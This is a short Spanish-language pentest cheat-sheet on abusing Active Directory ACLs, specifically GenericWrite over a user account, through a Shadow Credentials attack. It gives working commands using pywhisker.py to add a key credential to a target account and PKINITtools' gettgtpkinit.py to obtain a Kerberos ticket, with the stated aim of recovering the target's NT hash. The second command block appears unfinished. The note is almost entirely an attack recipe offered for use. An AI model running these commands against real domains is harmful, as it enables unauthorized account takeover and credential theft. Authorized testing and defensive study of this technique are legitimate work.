# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket 

## GenericWrite sobre Usuario 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 

Notas:
	1. El output muestra la 'password' que se utilizará 
	2. Crea un 'cert.pfx' 
```

```bash 
Seguir los siguientes pasos para obtener el hash NT:
❯ git clone https://github.com/dirkjanm/PKINITtools     # Clonar e ingresar 

❯ python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/targetAccount output.ccache 
❯ 
❯ 
❯ 
```